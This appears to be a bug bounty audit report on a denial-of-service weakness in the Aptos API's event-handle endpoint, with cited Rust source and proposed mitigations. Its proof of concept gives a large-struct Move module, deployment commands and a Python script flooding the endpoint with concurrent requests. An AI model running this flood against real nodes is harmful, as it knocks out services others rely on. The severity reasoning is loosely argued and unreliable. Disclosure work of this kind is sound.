# Audit Report

## Title
API Resource Exhaustion via Repeated Large Struct Deserialization in Event Handle Queries

## Summary
The `/accounts/:address/events/:event_handle/:field_name` endpoint is vulnerable to resource exhaustion attacks. When querying a non-existent event handle field, the API deserializes the entire struct before checking if the field exists. An attacker can repeatedly query large structs with non-existent field names to exhaust CPU resources and blocking thread pool capacity, causing API unavailability and validator node slowdowns.

## Finding Description

The vulnerability exists in the event query flow where the API endpoint `get_events_by_event_handle()` calls `Account::find_event_key()`, which performs full struct deserialization before field validation. [1](#0-0) 

The critical issue occurs in the `find_event_key()` method: [2](#0-1) 

The method calls `find_resource()` at line 606, which internally calls `move_struct_fields()` to deserialize the entire struct into a vector of field name-value pairs: [3](#0-2) 

The deserialization occurs via `move_struct_fields()`: [4](#0-3) 

**The attack path:**

1. Attacker deploys a Move module containing a struct with the maximum number of fields allowed by `max_type_nodes` (128-256 type nodes, allowing ~64-128 fields with simple types)
2. Attacker publishes this struct as a resource on their account
3. Attacker sends thousands of concurrent requests to `/accounts/:address/events/:event_handle/:field_name` with:
   - Their account address
   - The large struct's tag
   - A non-existent field name (e.g., "fake_event_handle")
4. Each request spawns a blocking task that deserializes the entire large struct
5. After expensive deserialization, the search for the non-existent field fails
6. The API returns a 404 error, but CPU resources have been consumed

**Crucially, there is NO limit on the number of struct fields in production:** [5](#0-4) 

While `max_type_nodes` provides an indirect limit, structs with 100+ simple fields are feasible and each request fully deserializes them.

**There is NO rate limiting in the API code:** [6](#0-5) 

The middleware only includes CORS, compression, size limits, and panic catching—no rate limiter.

**The blocking task spawning has no concurrency limits:** [7](#0-6) 

This simply spawns blocking tasks without any resource management or rate limiting, using tokio's default thread pool (typically equal to CPU cores).

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under the Aptos Bug Bounty program criteria:

1. **"Validator node slowdowns" (High Severity):** If the API service runs on validator nodes (common in production), this attack causes significant CPU exhaustion and thread pool starvation, degrading validator performance.

2. **"API crashes" (High Severity):** Exhausting all blocking threads can cause the API to become completely unresponsive, requiring manual intervention.

3. **"State inconsistencies requiring intervention" (Medium Severity):** The service degradation requires operator intervention to mitigate the attack.

The attack breaks the **Resource Limits invariant (#9)**: "All operations must respect gas, storage, and computational limits." The API allows unbounded CPU consumption for deserializing large structs with no throttling mechanism.

While this doesn't directly compromise consensus or cause loss of funds, it significantly impacts availability—a core requirement for blockchain infrastructure.

## Likelihood Explanation

**Likelihood: High**

The attack is highly practical and requires no special privileges:

1. **Low barrier to entry:** Attacker only needs to deploy a Move module (costs minimal gas) and send HTTP requests
2. **No authentication required:** API endpoints are publicly accessible
3. **No rate limiting:** The attack can scale to thousands of concurrent requests
4. **Deterministic behavior:** The deserialization cost is predictable and repeatable
5. **Wide attack surface:** Any node exposing the API endpoint is vulnerable

The only limiting factor is network bandwidth, but modern cloud infrastructure makes it trivial to generate sufficient request volume.

## Recommendation

Implement multiple defense layers:

1. **Add rate limiting middleware** at the API layer:
```rust
// In api/src/runtime.rs, add rate limiter middleware
use aptos_rate_limiter::rate_limit::TokenBucketRateLimiter;

let rate_limiter = TokenBucketRateLimiter::new(100, 100); // 100 req/min
route.with(RateLimitMiddleware::new(rate_limiter))
```

2. **Implement early field existence check** before deserialization by examining the struct definition from the module metadata instead of deserializing the entire resource.

3. **Add explicit field count limit** in production config:
```rust
// In aptos-move/aptos-vm-environment/src/prod_configs.rs
max_fields_in_struct: Some(30), // Enforce reasonable limit
```

4. **Cache deserialized structures** with TTL to avoid repeated deserialization of the same resource.

5. **Add request coalescing** to deduplicate concurrent identical requests.

## Proof of Concept

**Step 1: Create a large struct Move module**

```move
module attacker::large_resource {
    struct LargeStruct has key {
        field_0: u64, field_1: u64, field_2: u64, field_3: u64,
        field_4: u64, field_5: u64, field_6: u64, field_7: u64,
        // ... repeat up to max_type_nodes limit (~100+ fields)
        field_99: u64,
        field_100: u64,
    }
    
    public entry fun publish(account: &signer) {
        move_to(account, LargeStruct {
            field_0: 0, field_1: 1, field_2: 2, field_3: 3,
            // ... initialize all fields
            field_99: 99, field_100: 100,
        });
    }
}
```

**Step 2: Deploy and publish the resource**

```bash
aptos move publish --package-dir ./attacker_module
aptos move run --function-id 'attacker::large_resource::publish'
```

**Step 3: Execute the DoS attack**

```python
import concurrent.futures
import requests

def attack_request():
    url = "http://api-node:8080/v1/accounts/0xATTACKER_ADDRESS/events/0xATTACKER_ADDRESS::large_resource::LargeStruct/fake_event_field"
    response = requests.get(url)
    return response.status_code

# Launch 1000 concurrent requests
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(attack_request) for _ in range(1000)]
    results = [f.result() for f in futures]
    print(f"Completed {len(results)} requests")
```

**Expected behavior:** The API becomes unresponsive after exhausting the blocking thread pool. Legitimate requests time out. CPU usage on the API node spikes to 100%.

## Notes

This vulnerability is distinct from network-level DoS (which is out of scope) because it exploits application-level inefficiency in the deserialization logic. The attack leverages legitimate API functionality with carefully crafted inputs to cause disproportionate resource consumption—a classic resource exhaustion vulnerability that falls within the bug bounty scope.

### Citations

**File:** api/src/events.rs (L101-150)
```rust
    async fn get_events_by_event_handle(
        &self,
        accept_type: AcceptType,
        /// Hex-encoded 32 byte Aptos account, with or without a `0x` prefix, for
        /// which events are queried. This refers to the account that events were
        /// emitted to, not the account hosting the move module that emits that
        /// event type.
        address: Path<Address>,
        /// Name of struct to lookup event handle e.g. `0x1::account::Account`
        event_handle: Path<MoveStructTag>,
        /// Name of field to lookup event handle e.g. `withdraw_events`
        field_name: Path<IdentifierWrapper>,
        /// Starting sequence number of events.
        ///
        /// If unspecified, by default will retrieve the most recent
        start: Query<Option<U64>>,
        /// Max number of events to retrieve.
        ///
        /// If unspecified, defaults to default page size
        limit: Query<Option<u16>>,
    ) -> BasicResultWith404<Vec<VersionedEvent>> {
        event_handle
            .0
            .verify(0)
            .context("'event_handle' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        verify_field_identifier(field_name.as_str())
            .context("'field_name' invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code_no_info(err, AptosErrorCode::InvalidInput)
            })?;
        fail_point_poem("endpoint_get_events_by_event_handle")?;
        self.context
            .check_api_output_enabled("Get events by event handle", &accept_type)?;
        let page = Page::new(
            start.0.map(|v| v.0),
            limit.0,
            self.context.max_events_page_size(),
        );

        let api = self.clone();
        api_spawn_blocking(move || {
            let account = Account::new(api.context.clone(), address.0, None, None, None)?;
            let key = account.find_event_key(event_handle.0, field_name.0.into())?;
            api.list(account.latest_ledger_info, accept_type, page, key)
        })
        .await
    }
```

**File:** api/src/accounts.rs (L588-644)
```rust
    pub fn find_event_key(
        &self,
        struct_tag: MoveStructTag,
        field_name: Identifier,
    ) -> Result<EventKey, BasicErrorWith404> {
        // Parse the struct tag
        let struct_tag: StructTag = (&struct_tag)
            .try_into()
            .context("Given event handle was invalid")
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;

        // Find the resource and retrieve the struct field
        let (_, resource) = self.find_resource(&struct_tag)?;
        let (_id, value) = resource
            .into_iter()
            .find(|(id, _)| id == &field_name)
            .ok_or_else(|| {
                struct_field_not_found(
                    self.address,
                    &struct_tag,
                    &field_name,
                    self.ledger_version,
                    &self.latest_ledger_info,
                )
            })?;

        // Deserialize the event handle to retrieve the key
        let event_handle_bytes = bcs::to_bytes(&value)
            .context("Failed to serialize event handle from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &self.latest_ledger_info,
                )
            })?;
        // Deserialization may fail because the bytes are not EventHandle struct type.
        let event_handle: EventHandle = bcs::from_bytes(&event_handle_bytes)
            .context(format!(
                "Deserialization error, field({}) type is not a EventHandle struct",
                field_name
            ))
            .map_err(|err| {
                BasicErrorWith404::bad_request_with_code(
                    err,
                    AptosErrorCode::InvalidInput,
                    &self.latest_ledger_info,
                )
            })?;
        Ok(*event_handle.key())
    }
```

**File:** api/src/accounts.rs (L648-696)
```rust
    fn find_resource(
        &self,
        resource_type: &StructTag,
    ) -> Result<
        (
            Option<Identifier>,
            Vec<(Identifier, move_core_types::value::MoveValue)>,
        ),
        BasicErrorWith404,
    > {
        let (ledger_info, requested_ledger_version, state_view) =
            self.context.state_view(Some(self.ledger_version))?;

        let bytes = state_view
            .as_converter(self.context.db.clone(), self.context.indexer_reader.clone())
            .find_resource(&state_view, self.address, resource_type)
            .context(format!(
                "Failed to query DB to check for {} at {}",
                resource_type.to_canonical_string(),
                self.address
            ))
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })?
            .ok_or_else(|| {
                resource_not_found(
                    self.address,
                    resource_type,
                    requested_ledger_version,
                    &ledger_info,
                )
            })?;

        state_view
            .as_converter(self.context.db.clone(), self.context.indexer_reader.clone())
            .move_struct_fields(resource_type, &bytes)
            .context("Failed to convert move structs from storage")
            .map_err(|err| {
                BasicErrorWith404::internal_with_code(
                    err,
                    AptosErrorCode::InternalError,
                    &ledger_info,
                )
            })
    }
```

**File:** third_party/move/tools/move-resource-viewer/src/lib.rs (L356-382)
```rust
    pub fn move_struct_fields(
        &self,
        tag: &StructTag,
        blob: &[u8],
    ) -> anyhow::Result<(Option<Identifier>, Vec<(Identifier, MoveValue)>)> {
        let ty = self.resolve_struct_tag(tag, &mut Limiter::default())?;
        let struct_def = (ty.as_ref()).try_into().map_err(into_vm_status)?;
        Ok(match MoveStruct::simple_deserialize(blob, &struct_def)? {
            MoveStruct::Runtime(values) => {
                let (tag, field_names) = self.get_field_information(&ty, None)?;
                debug_assert_eq!(tag, None);
                (None, field_names.into_iter().zip(values).collect())
            },
            MoveStruct::RuntimeVariant(tag, values) => {
                let (variant_info, field_names) = self.get_field_information(&ty, Some(tag))?;
                (
                    variant_info.map(|(_, name)| name),
                    field_names.into_iter().zip(values).collect(),
                )
            },
            MoveStruct::WithFields(fields)
            | MoveStruct::WithTypes {
                _fields: fields, ..
            } => (None, fields),
            MoveStruct::WithVariantFields(name, _, fields) => (Some(name), fields),
        })
    }
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L170-170)
```rust
        max_fields_in_struct: None,
```

**File:** api/src/runtime.rs (L253-259)
```rust
            .with(cors)
            .with_if(config.api.compression_enabled, Compression::new())
            .with(PostSizeLimit::new(size_limit))
            .with(CatchPanic::new().with_handler(panic_handler))
            // NOTE: Make sure to keep this after all the `with` middleware.
            .catch_all_error(convert_error)
            .around(middleware_log);
```

**File:** api/src/context.rs (L1645-1654)
```rust
pub async fn api_spawn_blocking<F, T, E>(func: F) -> Result<T, E>
where
    F: FnOnce() -> Result<T, E> + Send + 'static,
    T: Send + 'static,
    E: InternalError + Send + 'static,
{
    tokio::task::spawn_blocking(func)
        .await
        .map_err(|err| E::internal_with_code_no_info(err, AptosErrorCode::InternalError))?
}
```
